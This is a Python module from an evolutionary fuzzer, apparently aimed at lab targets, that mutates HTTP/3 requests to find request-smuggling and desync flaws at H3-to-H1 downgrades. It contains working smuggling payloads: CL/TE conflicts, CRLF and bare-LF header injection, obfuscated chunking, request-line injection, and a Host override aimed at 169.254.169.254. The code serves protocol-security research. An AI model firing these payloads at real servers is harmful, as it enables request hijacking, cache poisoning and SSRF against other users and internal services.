# Phage: H3 framing genome and genetic operators.
# License: Apache-2.0 License

"""Framing-sequence genome. Each op maps to one aioquic H3 call, so a genome is
always sendable. Mutation and crossover are the genetic operators."""

import random
from dataclasses import dataclass, replace
from typing import Callable, List, Optional, Tuple, Union

Field = Tuple[bytes, bytes]


@dataclass(frozen=True)
class Headers:
    """One H3 HEADERS frame (maps to H3Connection.send_headers)."""

    fields: Tuple[Field, ...]
    end_stream: bool = False


@dataclass(frozen=True)
class Data:
    """One H3 DATA frame (maps to H3Connection.send_data)."""

    payload: bytes
    end_stream: bool = False


@dataclass(frozen=True)
class Delay:
    """Client-side pause before the next op (the FIN-sync gene)."""

    seconds: float


@dataclass(frozen=True)
class Reset:
    """RESET_STREAM (maps to QuicConnection.reset_stream)."""

    error_code: int = 0


@dataclass(frozen=True)
class Fin:
    """A bare QUIC STREAM FIN: an empty stream write with end_stream=True, no H3
    DATA frame (maps to QuicConnection.send_stream_data(b"", end_stream=True)). This
    is the standalone-FIN primitive (CVE-2026-33555): after HEADERS declaring a
    Content-Length, a bare FIN with the buffer empty makes a vulnerable H3->H1
    downgrade mark the message complete without the body, forwarding CL:N + 0 bytes."""


@dataclass(frozen=True)
class StopSending:
    """STOP_SENDING on the request stream (maps to QuicConnection.stop_stream).
    A receiver-side control: it aborts the peer's SENDING (the response), not the
    request body, so it is a connection-state probe, not a request-smuggling
    primitive. Included for QUIC-state coverage; the body-truncation vectors that
    matter are Fin and Reset."""

    error_code: int = 0


Op = Union[Headers, Data, Delay, Reset, Fin, StopSending]
Genome = List[Op]

# H3 error codes worth resetting with.
H3_NO_ERROR = 0x100
H3_REQUEST_CANCELLED = 0x10C


def seed_post(
    path: bytes = b"/",
    authority: bytes = b"lab",
    body: bytes = b"AAAA",
    method: bytes = b"POST",
) -> Genome:
    """A well-formed POST mirroring Phage's FIN-sync shape (the clean baseline)."""
    cl = str(len(body)).encode()
    fields = (
        (b":method", method),
        (b":scheme", b"https"),
        (b":authority", authority),
        (b":path", path),
        (b"content-length", cl),
    )
    head, tail = (body[:-1], body[-1:]) if body else (b"", b"")
    return [
        Headers(fields, end_stream=False),
        Data(head, end_stream=False),
        Delay(0.0),
        Data(tail, end_stream=True),
    ]


# --- Structural read-outs used for behavior descriptors and oracles. ---


def declared_content_length(g: Genome) -> Optional[int]:
    for op in g:
        if isinstance(op, Headers):
            for k, v in op.fields:
                if k.lower() == b"content-length":
                    return int(v) if v.isdigit() else None
    return None


def total_data_len(g: Genome) -> int:
    return sum(len(op.payload) for op in g if isinstance(op, Data))


def cl_relation(g: Genome) -> str:
    """Declared content-length vs bytes sent: 'match', 'under', 'over' or 'none'."""
    cl = declared_content_length(g)
    if cl is None:
        return "none"
    n = total_data_len(g)
    if cl == n:
        return "match"
    return "over" if cl > n else "under"


def frame_types(g: Genome) -> frozenset:
    t = set()
    for op in g:
        if isinstance(op, Headers):
            t.add("H")
        elif isinstance(op, Data):
            t.add("D")
        elif isinstance(op, Reset):
            t.add("R")
    return frozenset(t)


def has_trailers(g: Genome) -> bool:
    """A HEADERS frame after any DATA frame (the trailer-injection vector)."""
    seen_data = False
    for op in g:
        if isinstance(op, Data):
            seen_data = True
        elif isinstance(op, Headers) and seen_data:
            return True
    return False


def descriptor(g: Genome) -> tuple:
    """MAP-Elites behavior descriptor. Hashable, used as the archive cell key."""
    n = len(g)
    size_bucket = 0 if n <= 4 else 1 if n <= 8 else 2
    return (
        size_bucket,
        frame_types(g),
        cl_relation(g),
        has_trailers(g),
        any(isinstance(o, Reset) for o in g),
    )


# --- Mutation operators (the genes that change). rng injected for determinism. ---


def _mut_toggle_fin(g: Genome, rng: random.Random) -> Genome:
    idx = [i for i, o in enumerate(g) if isinstance(o, (Data, Headers))]
    if not idx:
        return g
    i = rng.choice(idx)
    g = list(g)
    g[i] = replace(g[i], end_stream=not g[i].end_stream)
    return g


def _mut_content_length(g: Genome, rng: random.Random) -> Genome:
    g = list(g)
    for i, o in enumerate(g):
        if not isinstance(o, Headers):
            continue
        fields = list(o.fields)
        for j, (k, v) in enumerate(fields):
            if k.lower() == b"content-length":
                cur = int(v) if v.isdigit() else 0
                delta = rng.choice([-2, -1, 1, 2])
                fields[j] = (k, str(max(0, cur + delta)).encode())
                g[i] = replace(o, fields=tuple(fields))
                return g
    return g


def _mut_insert_reset(g: Genome, rng: random.Random) -> Genome:
    g = list(g)
    g.insert(
        rng.randint(0, len(g)), Reset(rng.choice([H3_NO_ERROR, H3_REQUEST_CANCELLED]))
    )
    return g


def _mut_split_data(g: Genome, rng: random.Random) -> Genome:
    idx = [i for i, o in enumerate(g) if isinstance(o, Data) and len(o.payload) >= 2]
    if not idx:
        return g
    i = rng.choice(idx)
    o = g[i]
    cut = rng.randint(1, len(o.payload) - 1)
    g = list(g)
    g[i : i + 1] = [Data(o.payload[:cut], False), Data(o.payload[cut:], o.end_stream)]
    return g


def _mut_reorder(g: Genome, rng: random.Random) -> Genome:
    if len(g) < 2:
        return g
    i = rng.randint(0, len(g) - 2)
    g = list(g)
    g[i], g[i + 1] = g[i + 1], g[i]
    return g


def _mut_add_trailer(g: Genome, rng: random.Random) -> Genome:
    g = list(g)
    g.append(Headers(((b"x-smuggle", b"1"),), end_stream=True))
    return g


def _mut_delay(g: Genome, rng: random.Random) -> Genome:
    g = list(g)
    choice = rng.choice([0.0, 0.5, 1.0, 2.0])
    for i, o in enumerate(g):
        if isinstance(o, Delay):
            g[i] = Delay(choice)
            return g
    g.insert(rng.randint(0, len(g)), Delay(choice))
    return g


SMUGGLE_PAYLOAD = b"GET /smuggled HTTP/1.1\r\nHost: x\r\n\r\n"


def _mut_inject_smuggle(g: Genome, rng: random.Random) -> Genome:
    """Put a request-shaped body into a DATA frame (the smuggle-payload gene)."""
    g = list(g)
    idx = [i for i, o in enumerate(g) if isinstance(o, Data)]
    if idx:
        i = rng.choice(idx)
        g[i] = Data(SMUGGLE_PAYLOAD, g[i].end_stream)
    else:
        g.append(Data(SMUGGLE_PAYLOAD, end_stream=True))
    return g


def _mut_te_chunked(g: Genome, rng: random.Random) -> Genome:
    """Add Transfer-Encoding: chunked (the TE.CL desync primitive)."""
    g = list(g)
    for i, o in enumerate(g):
        if isinstance(o, Headers):
            if any(k.lower() == b"transfer-encoding" for k, _ in o.fields):
                return g
            g[i] = replace(o, fields=o.fields + ((b"transfer-encoding", b"chunked"),))
            return g
    g.insert(0, Headers(((b"transfer-encoding", b"chunked"),)))
    return g


def _mut_dup_content_length(g: Genome, rng: random.Random) -> Genome:
    """Duplicate content-length with a different value (the CL.CL desync primitive)."""
    g = list(g)
    for i, o in enumerate(g):
        if isinstance(o, Headers):
            for k, v in o.fields:
                if k.lower() == b"content-length":
                    alt = b"0" if v != b"0" else b"9"
                    g[i] = replace(o, fields=o.fields + ((b"content-length", alt),))
                    return g
    return g


def _mut_case_variant_cl(g: Genome, rng: random.Random) -> Genome:
    """CVE-2026-1525: a case-variant duplicate Content-Length with a conflicting
    value (`content-length: N` plus `Content-Length: 0`)."""
    g = list(g)
    for i, o in enumerate(g):
        if isinstance(o, Headers) and any(
            k.lower() == b"content-length" for k, _ in o.fields
        ):
            g[i] = replace(o, fields=o.fields + ((b"Content-Length", b"0"),))
            return g
    return g


def _mut_te_obfuscate(g: Genome, rng: random.Random) -> Genome:
    """TE.TE: an obfuscated Transfer-Encoding some parsers honor and others drop
    (leading-space name, tab, or a conflicting second value)."""
    variant = rng.choice(
        [
            (b" transfer-encoding", b"chunked"),
            (b"transfer-encoding", b"chunked, identity"),
            (b"transfer-encoding", b"\tchunked"),
        ]
    )
    g = list(g)
    for i, o in enumerate(g):
        if isinstance(o, Headers):
            g[i] = replace(o, fields=o.fields + (variant,))
            return g
    g.insert(0, Headers((variant,)))
    return g


def _mut_header_crlf_injection(g: Genome, rng: random.Random) -> Genome:
    """CVE-2026-1527 class: CRLF inside a header value smuggling a second request
    (rejected by a conformant H3 stack, honored by a vulnerable one)."""
    inj = (b"x-smuggle", b"1\r\n" + SMUGGLE_PAYLOAD.rstrip(b"\r\n"))
    g = list(g)
    for i, o in enumerate(g):
        if isinstance(o, Headers):
            g[i] = replace(o, fields=o.fields + (inj,))
            return g
    return g


def _chunk(body: bytes) -> bytes:
    """Wrap bytes in one chunked-transfer layer (one chunk + terminator)."""
    return b"%x\r\n%s\r\n0\r\n\r\n" % (len(body), body)


def _mut_nested_chunk(g: Genome, rng: random.Random) -> Genome:
    """Double-TE framing: a chunk wrapping an inner 0-terminator + smuggled
    request. Inert to a single de-chunk (parses as 1); a proxy that de-chunks a
    layer and forwards with TE still set, to a backend that de-chunks again,
    smuggles the trailing request. See lab/dechunk_front.py."""
    outer = _chunk(b"0\r\n\r\n" + SMUGGLE_PAYLOAD)
    g = list(g)
    for i, o in enumerate(g):
        if isinstance(o, Headers):
            if not any(k.lower() == b"transfer-encoding" for k, _ in o.fields):
                g[i] = replace(
                    o, fields=o.fields + ((b"transfer-encoding", b"chunked"),)
                )
            break
    idx = [i for i, o in enumerate(g) if isinstance(o, Data)]
    if idx:
        i = idx[-1]
        g[i] = Data(outer, g[i].end_stream)
    else:
        g.append(Data(outer, end_stream=True))
    return g


def _mut_bare_lf_chunk(g: Genome, rng: random.Random) -> Genome:
    """Frame the body as chunked, then flip some CRLF terminators to a bare LF.
    A parser that accepts a bare-LF terminator where a strict one requires CRLF
    disagrees on chunk boundaries (CWE-444, the CVE-2025-65114 class). Each of the
    three terminators (after chunk data, after the 0-size, the final blank line) is
    independently CRLF or bare LF, so the search can place the malformation and let
    the oracle keep only the placement that actually flips behaviour."""
    def term() -> bytes:
        return rng.choice((b"\r\n", b"\n"))

    size = rng.choice((1, 5, 0x10, 0x30))
    data = bytes(rng.randrange(65, 91) for _ in range(size))
    # size line stays CRLF: a bare LF *inside* the size line is rejected even on the
    # vulnerable build; the reachable position is the terminator after chunk data.
    body = b"%x\r\n%s%s0%s%s" % (size, data, term(), term(), term())
    # keep the headers, drop any existing Data so the chunk framing is the whole
    # body (a stray prefix would turn the size line into different hex on both
    # builds, a non-differential dead end).
    g = [o for o in g if not isinstance(o, Data)]
    for i, o in enumerate(g):
        if isinstance(o, Headers):
            if not any(k.lower() == b"transfer-encoding" for k, _ in o.fields):
                g[i] = replace(
                    o, fields=o.fields + ((b"transfer-encoding", b"chunked"),)
                )
            break
    g.append(Data(body, end_stream=True))
    return g


def _chunk_replace(g: Genome, body: bytes) -> Genome:
    """Ensure Transfer-Encoding: chunked and make `body` the whole chunked body
    (drop any prior Data). Shared by the chunk-obfuscation genes."""
    g = [o for o in g if not isinstance(o, Data)]
    for i, o in enumerate(g):
        if isinstance(o, Headers):
            if not any(k.lower() == b"transfer-encoding" for k, _ in o.fields):
                g[i] = replace(o, fields=o.fields + ((b"transfer-encoding", b"chunked"),))
            break
    g.append(Data(body, end_stream=True))
    return g


def _mut_chunk_ext(g: Genome, rng: random.Random) -> Genome:
    """Chunk-extension on the size line (`5;ext=v\\r\\n...`). A parser that skips the
    extension and one that mis-parses it disagree on the chunk boundary (CVE-2025-55315
    class). ATS forwards extensions verbatim, so a downstream pair can disagree on
    ATS's output while every raw pair looked clean."""
    size = rng.choice((5, 0x10, 0x20))
    data = bytes(rng.randrange(65, 91) for _ in range(size))
    ext = rng.choice((b";a=b", b";x", b";" + b"a" * 8 + b"=" + b"b" * 8, b";a=\"q\""))
    where = rng.choice(("size", "zero", "both"))
    sz = (b"%x" % size) + (ext if where in ("size", "both") else b"")
    zero = b"0" + (ext if where in ("zero", "both") else b"")
    body = b"%s\r\n%s\r\n%s\r\n\r\n" % (sz, data, zero)
    return _chunk_replace(g, body)


def _mut_chunk_size_obfuscate(g: Genome, rng: random.Random) -> Genome:
    """Obfuscated chunk-size token: leading zeros, trailing SP/TAB, or a 0x/+ prefix.
    A strtol-style parser and a strict-hex parser disagree on the size and thus the
    boundary. ATS forwards these verbatim."""
    size = rng.choice((5, 0x10, 0x1F))
    hexs = b"%x" % size
    tok = rng.choice((
        b"0" * rng.randint(1, 4) + hexs,          # leading zeros
        hexs + rng.choice((b" ", b"\t", b"  ")),  # trailing whitespace
        b"0x" + hexs,                              # 0x prefix
        b"+" + hexs,                               # + prefix
    ))
    data = bytes(rng.randrange(65, 91) for _ in range(size))
    body = b"%s\r\n%s\r\n0\r\n\r\n" % (tok, data)
    return _chunk_replace(g, body)


def _mut_chunk_trailer(g: Genome, rng: random.Random) -> Genome:
    """Trailer field after the 0-chunk (`0\\r\\n<name>: <val>\\r\\n\\r\\n`). A hop that
    promotes a trailer to a header, strips it, or keeps it disagrees with the others;
    a framing header smuggled in the trailer is the payload."""
    size = rng.choice((5, 0x10))
    data = bytes(rng.randrange(65, 91) for _ in range(size))
    trailer = rng.choice((
        b"X-T: y",
        b"Transfer-Encoding: chunked",
        b"Content-Length: 0",
    ))
    body = b"%x\r\n%s\r\n0\r\n%s\r\n\r\n" % (size, data, trailer)
    return _chunk_replace(g, body)


# --- Head-side line malformations. render_h1 concatenates raw, so these live in
# header names/values and pseudo-headers; the genome stays structured (Headers ops)
# so they still crossover/recombine and compose WITH a CL/TE conflict. That
# composition across mutation steps is what mints a chain-emergent desync: a lenient
# hop normalises the malformed line into a framing header the strict hop mis-frames.


def _mut_ws_before_colon(g: Genome, rng: random.Random) -> Genome:
    """Whitespace before the colon on a framing header (`Transfer-Encoding : chunked`
    or `Content-Length : 0`). One parser strips the trailing-space field name and
    honours the header, another treats it as unknown, so the two disagree on framing.
    Additive: the space-named variant sits beside the clean header (a ws-obfuscated
    duplicate), and its lowercased name never equals `content-length`, so render's
    content-length auto-insert is untouched."""
    name = rng.choice((b"transfer-encoding", b"content-length"))
    variant = (name + b" ", b"chunked" if name == b"transfer-encoding" else b"0")
    g = list(g)
    for i, o in enumerate(g):
        if isinstance(o, Headers):
            g[i] = replace(o, fields=o.fields + (variant,))
            return g
    g.insert(0, Headers((variant,)))
    return g


def _mut_bare_lf_header(g: Genome, rng: random.Random) -> Genome:
    """A framing header smuggled behind a BARE LF inside another header's value. A
    lenient hop treating a lone \\n as a line break sees `Transfer-Encoding: chunked`;
    a strict hop sees one long value (CWE-444, the bare-LF class). The chain-emergent
    primitive: the lenient edge mints the ambiguity the strict origin mis-frames."""
    smug = rng.choice((b"Transfer-Encoding: chunked", b"Content-Length: 0"))
    inj = (b"x-pad", b"1\n" + smug)
    g = list(g)
    for i, o in enumerate(g):
        if isinstance(o, Headers):
            g[i] = replace(o, fields=o.fields + (inj,))
            return g
    g.insert(0, Headers((inj,)))
    return g


def _mut_bare_cr_header(g: Genome, rng: random.Random) -> Genome:
    """Same smuggle behind a BARE CR (a \\r not followed by \\n). Some parsers end a
    line on a lone CR, others keep it as data, so a CR-smuggled framing header is
    seen by only one side (the bare-CR variant of CWE-444)."""
    smug = rng.choice((b"Transfer-Encoding: chunked", b"Content-Length: 0"))
    inj = (b"x-pad", b"1\r" + smug)
    g = list(g)
    for i, o in enumerate(g):
        if isinstance(o, Headers):
            g[i] = replace(o, fields=o.fields + (inj,))
            return g
    g.insert(0, Headers((inj,)))
    return g


def _mut_obs_fold(g: Genome, rng: random.Random) -> Genome:
    """obs-fold (RFC 7230-deprecated line folding): a Transfer-Encoding value
    continued on an indented line. One parser joins the fold into the value, another
    starts a new header, so the folded TE is honoured by only one side."""
    inj = (b"transfer-encoding", b"\r\n chunked")
    g = list(g)
    for i, o in enumerate(g):
        if isinstance(o, Headers):
            g[i] = replace(o, fields=o.fields + (inj,))
            return g
    g.insert(0, Headers((inj,)))
    return g


def _mut_absolute_form(g: Genome, rng: random.Random) -> Genome:
    """Absolute-form request target (`POST http://lab/x HTTP/1.1`). A proxy may
    rewrite it to origin-form for the backend or forward it verbatim; a backend that
    rejects or re-routes absolute-form then disagrees with the proxy on the target."""
    g = list(g)
    for i, o in enumerate(g):
        if isinstance(o, Headers) and any(k.lower() == b":path" for k, _ in o.fields):
            fields = tuple(
                (k, b"http://lab" + (v if v.startswith(b"/") else b"/" + v))
                if k.lower() == b":path"
                else (k, v)
                for k, v in o.fields
            )
            g[i] = replace(o, fields=fields)
            return g
    return g


def _mut_rl_space(g: Genome, rng: random.Random) -> Genome:
    """Extra whitespace in the request line (`POST  / HTTP/1.1`, or a tab). Parsers
    that split the request line on a single SP versus a run of whitespace disagree on
    the method/target boundary."""
    ws = rng.choice((b" ", b"\t"))
    g = list(g)
    for i, o in enumerate(g):
        if isinstance(o, Headers) and any(k.lower() == b":method" for k, _ in o.fields):
            fields = tuple(
                (k, v + ws) if k.lower() == b":method" else (k, v)
                for k, v in o.fields
            )
            g[i] = replace(o, fields=fields)
            return g
    return g


# QUERY (RFC 10008) and SEARCH are safe methods that carry a body; unknown verbs
# and bodyless verbs (GET/HEAD) are where a proxy and backend disagree on framing.
HTTP_VERBS = (b"QUERY", b"SEARCH", b"GET", b"HEAD", b"PATCH", b"PURGE", b"ZZZ")


def _mut_http_method(g: Genome, rng: random.Random) -> Genome:
    """Swap :method to a verb (incl. QUERY): a method one side treats as bodyless
    and the other reads smuggles the body as a request (method-based CL.0)."""
    g = list(g)
    for i, o in enumerate(g):
        if isinstance(o, Headers) and any(k.lower() == b":method" for k, _ in o.fields):
            fields = tuple(
                (k, rng.choice(HTTP_VERBS)) if k.lower() == b":method" else (k, v)
                for k, v in o.fields
            )
            g[i] = replace(o, fields=fields)
            return g
    return g


# --- HTTP/3 -> HTTP/1 downgrade attack genes (the QUIC-transport / H3-synthesis
# boundary). Driven over real H3 (driver.py); render_h1 ignores the transport-only
# ops. The QUIC-state class generalizes CVE-2026-33555 (declared CL != delivered
# body via QUIC stream state). aioquic is a conformant client, so CR/LF and
# duplicate-pseudo synthesis vectors do NOT reach the wire without a raw QPACK path;
# these genes stay within what a real H3 client can send. ---


def _h3_set_cl(g: Genome, n: int) -> Genome:
    """Drop existing body/terminators; set content-length: n on the request HEADERS
    (end_stream=False), synthesizing a POST skeleton if none exists. Returns the ops
    with no Data/Fin/Reset (caller appends the terminator sequence)."""
    g = [o for o in g if not isinstance(o, (Data, Fin, Reset))]
    out, found = [], False
    for o in g:
        if isinstance(o, Headers) and any(k.lower() == b":method" for k, _ in o.fields):
            fields = tuple((k, v) for k, v in o.fields if k.lower() != b"content-length")
            out.append(replace(o, fields=fields + ((b"content-length", str(n).encode()),),
                               end_stream=False))
            found = True
        else:
            out.append(o)
    if not found:
        out.insert(0, Headers(((b":method", b"POST"), (b":scheme", b"https"),
                               (b":authority", b"lab"), (b":path", b"/"),
                               (b"content-length", str(n).encode())), end_stream=False))
    return out


def _mut_standalone_fin(g: Genome, rng: random.Random) -> Genome:
    """CVE-2026-33555 class: declare content-length N, deliver 0 body, end the stream
    with a bare FIN. A vulnerable H3->H1 downgrade forwards CL:N + 0 bytes and pools
    the desynced backend connection (the next request's first N bytes are eaten)."""
    out = _h3_set_cl(g, rng.choice((1, 5, 10, 48, 100)))
    out.append(Fin())
    return out


def _mut_body_length_lie(g: Genome, rng: random.Random) -> Genome:
    """Declared content-length != bytes actually delivered over QUIC (a real DATA
    frame shorter than CL, then FIN). Downgrade and backend disagree on the boundary."""
    n = rng.choice((5, 10, 48, 100))
    m = rng.choice((0, 1, 3))
    out = _h3_set_cl(g, n)
    if m > 0:
        out.append(Data(b"A" * m, end_stream=False))
    out.append(Fin())
    return out


def _mut_reset_mid_body(g: Genome, rng: random.Random) -> Genome:
    """RESET_STREAM after partial body: declare CL:N, send M<N bytes, then abort the
    stream. A downgrade that forwards the partial body and reuses the backend conn
    without resetting it desyncs the pool."""
    out = _h3_set_cl(g, rng.choice((10, 48, 100)))
    out.append(Data(b"A" * rng.choice((1, 3, 5)), end_stream=False))
    out.append(Reset(rng.choice([H3_NO_ERROR, H3_REQUEST_CANCELLED])))
    return out


def _mut_authority_host_conflict(g: Genome, rng: random.Random) -> Genome:
    """:authority plus an explicit Host header with a different value. The downgrade
    synthesizes Host from :authority; a surviving conflicting Host reaches the backend
    (routing / cache-key / SSRF divergence). Valid H3, so it reaches the wire."""
    g = list(g)
    for i, o in enumerate(g):
        if isinstance(o, Headers) and any(k.lower() == b":method" for k, _ in o.fields):
            host = rng.choice((b"evil", b"internal", b"localhost", b"169.254.169.254"))
            g[i] = replace(o, fields=o.fields + ((b"host", host),))
            return g
    return g


def _mut_pseudo_path_space(g: Genome, rng: random.Random) -> Genome:
    """Whitespace / extra tokens in :path that the downgrade splices into the H1
    request line (`POST /a b HTTP/1.1`), testing request-line re-parsing on the
    backend. Valid H3 field value (no CR/LF), so aioquic sends it."""
    inj = rng.choice((b"/a b", b"/a\tb", b"/  /", b"/a HTTP/1.0", b"//", b"/a#b"))
    g = list(g)
    for i, o in enumerate(g):
        if isinstance(o, Headers) and any(k.lower() == b":path" for k, _ in o.fields):
            fields = tuple((k, inj) if k.lower() == b":path" else (k, v) for k, v in o.fields)
            g[i] = replace(o, fields=fields)
            return g
    return g


def _mut_h3_reqline_inject(g: Genome, rng: random.Random) -> Genome:
    """H3->H1 request-line / header injection via a pseudo-header the downgrade
    splices verbatim into the H1 request line (:path / :method carrying CR/LF and a
    smuggled request or header). Only reaches the wire over the raw QPACK path
    (aioquic rejects it); a downgrade that does not sanitize splices it into H1."""
    inj = rng.choice((
        b"/ HTTP/1.1\r\nHost: evil\r\nX-Smuggled: 1",
        b"/x\r\nTransfer-Encoding: chunked",
        b"/x\r\n\r\nGET /smuggled HTTP/1.1\r\nHost: y",
        b"/x\r\nContent-Length: 0",
    ))
    g = list(g)
    for i, o in enumerate(g):
        if isinstance(o, Headers) and any(k.lower() == b":path" for k, _ in o.fields):
            fields = tuple((k, inj) if k.lower() == b":path" else (k, v) for k, v in o.fields)
            g[i] = replace(o, fields=fields)
            return g
    return g


def _mut_h3_pseudo_dup(g: Genome, rng: random.Random) -> Genome:
    """Duplicate/conflicting pseudo-header (:method, :path, or :authority) or a value
    with a bare CR/LF/NUL. RFC 9114 forbids these; the raw QPACK path sends them so a
    downgrade that fails to reject picks one value while the backend sees another."""
    inj = rng.choice((
        (b":path", b"/b"), (b":method", b"POST"), (b":authority", b"evil"),
        (b"x-inj", b"1\rEvil: 2"), (b"x-inj", b"1\nEvil: 2"), (b"x-inj", b"1\x00Evil"),
    ))
    g = list(g)
    for i, o in enumerate(g):
        if isinstance(o, Headers) and any(k.lower() == b":method" for k, _ in o.fields):
            g[i] = replace(o, fields=o.fields + (inj,))
            return g
    return g


# H3-downgrade genes usable as a biased subset for the H3 hunt. The reqline/pseudo
# injection genes need the raw QPACK driver path (raw=True) to reach the wire.
H3_OPERATOR_NAMES = (
    "_mut_standalone_fin", "_mut_body_length_lie", "_mut_reset_mid_body",
    "_mut_authority_host_conflict", "_mut_pseudo_path_space",
    "_mut_h3_reqline_inject", "_mut_h3_pseudo_dup",
)


OPERATORS: Tuple[Callable[[Genome, random.Random], Genome], ...] = (
    _mut_toggle_fin,
    _mut_content_length,
    _mut_insert_reset,
    _mut_split_data,
    _mut_reorder,
    _mut_add_trailer,
    _mut_delay,
    _mut_inject_smuggle,
    _mut_te_chunked,
    _mut_dup_content_length,
    _mut_case_variant_cl,
    _mut_te_obfuscate,
    _mut_header_crlf_injection,
    _mut_nested_chunk,
    _mut_http_method,
    _mut_bare_lf_chunk,
    _mut_ws_before_colon,
    _mut_bare_lf_header,
    _mut_bare_cr_header,
    _mut_obs_fold,
    _mut_absolute_form,
    _mut_rl_space,
    _mut_chunk_ext,
    _mut_chunk_size_obfuscate,
    _mut_chunk_trailer,
    _mut_standalone_fin,
    _mut_body_length_lie,
    _mut_reset_mid_body,
    _mut_authority_host_conflict,
    _mut_pseudo_path_space,
    _mut_h3_reqline_inject,
    _mut_h3_pseudo_dup,
)


def mutate(g: Genome, rng: random.Random, n: int = 1) -> Genome:
    for _ in range(n):
        g = rng.choice(OPERATORS)(g, rng)
    return g


def _split_head(g: Genome) -> Tuple[Optional[Headers], Genome]:
    """Separate a leading HEADERS skeleton (request line) from the body ops."""
    if g and isinstance(g[0], Headers):
        return g[0], list(g[1:])
    return None, list(g)


def crossover(a: Genome, b: Genome, rng: random.Random) -> Genome:
    """Homologous crossover: keep one request skeleton, recombine the bodies, so a
    CL-lying parent and a smuggle-body parent assemble a single-request smuggle."""
    if not a or not b:
        return list(a) if a else list(b)
    head_a, tail_a = _split_head(a)
    head_b, tail_b = _split_head(b)
    heads = [h for h in (head_a, head_b) if h is not None]
    head = [rng.choice(heads)] if heads else []
    body = tail_a[: rng.randint(0, len(tail_a))] + tail_b[rng.randint(0, len(tail_b)) :]
    return head + body


def _levy_int(rng: random.Random, cap: int = 8, alpha: float = 1.5) -> int:
    """Levy-flight step count: mostly 1, rarely a large burst (heavy tail)."""
    u = rng.random() or 1e-12  # random() can return 0.0; 0**negative would raise
    n = int(u ** (-1.0 / alpha))
    return max(1, min(cap, n))


def mutate_levy(g: Genome, rng: random.Random, n: int = 1) -> Genome:
    """mutate() with a Levy-flight step count (the `n` argument is ignored so it
    is drop-in for evolve's mutate_fn)."""
    return mutate(g, rng, _levy_int(rng))


def recombine(a: Genome, b: Genome, rng: random.Random) -> Genome:
    """Symbiotic recombine: merge the header genes of BOTH parents (keeping
    duplicates) to assemble compound vectors (TE.CL, CL.CL) a blind splice can't."""
    if not a or not b:
        return list(a) if a else list(b)
    ha = a[0] if isinstance(a[0], Headers) else None
    hb = b[0] if isinstance(b[0], Headers) else None
    if ha is None or hb is None:
        return crossover(a, b, rng)
    extra = tuple(f for f in hb.fields if f not in ha.fields)
    merged = Headers(ha.fields + extra, ha.end_stream)
    body = a[1:] if rng.random() < 0.5 else b[1:]
    return [merged] + list(body)


def pick_operator(rng: random.Random, weights: List[float]) -> int:
    """Weighted choice over OPERATORS (uniform if all weights equal)."""
    r = rng.random() * sum(weights)
    acc = 0.0
    for i, w in enumerate(weights):
        acc += w
        if r <= acc:
            return i
    return len(weights) - 1


def apply_operator(g: Genome, idx: int, rng: random.Random) -> Genome:
    return OPERATORS[idx](g, rng)
